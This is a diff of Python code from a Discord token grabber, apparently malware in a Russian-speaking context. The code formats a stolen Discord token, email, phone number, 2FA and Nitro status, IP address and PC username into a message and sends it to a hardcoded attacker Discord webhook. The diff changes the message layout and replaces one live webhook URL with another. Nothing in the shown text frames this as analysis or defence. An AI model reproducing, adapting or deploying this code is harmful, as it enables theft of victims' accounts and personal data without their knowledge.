@@ -112,29 +112,23 @@ def get_token():
                             days_left = abs((d2 - d1).days)
                         embed = f"""> **{user_name}**  |  *({user_id})*
 
-> :gear: **Информация об аккаунте:**
-	Почта: `{email}`
-	Телефон: `{phone}`
-	Двухфакторка: `{mfa_enabled}`
-	Нитро: `{has_nitro}`
-	    Кончаетсячерез `{days_left if days_left else "None"} дней`
-
-> :computer: **Информация о пк:**
-	IP: `{ip}`
-	Пользователь: `{pc_username}`
-	Вход выполнен через `{platform}`
-
-> :warning: **Дс токен:**
-	`{tok}`
-
-`{pc_username} проебался!` @everyone :smiling_imp:"""
+`{email}`
+`{phone}`
+2fa `{mfa_enabled}`
+nitro `{has_nitro}`
+`{days_left if days_left else "None"}`
+`{ip}`
+pc `{pc_username}`
+`{platform}`
+`{tok}`
+<@755717499471003658>:"""
                         payload = json.dumps({'content': embed, 'username': 'день пися попы по понедельникам', 'avatar_url': 'https://cdn.discordapp.com/avatars/699217653885173760/b54929c369917b0da8049035780f6e88.webp?size=1024'})
                         try:
                             headers2 = {
                                 'Content-Type': 'application/json',
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
-                            req = Request('https://discord.com/api/webhooks/1005894059400892576/COENvly8_LPA45ROTaintbSX3ZSbqo_oOM-AOW08IR3xDL_aqSlpa5VZ49bEa4AktDcx', data=payload.encode(), headers=headers2)
+                            req = Request('https://discord.com/api/webhooks/1004373981572370472/AS-ksFTqzkrsdg4QJJWrtZVrqPZ9dGJRRH9RZIu9kek6uZ_qhBSnb8Y9b-p9OJioE-f5', data=payload.encode(), headers=headers2)
                             urlopen(req)
                         except: continue
                 else: continue
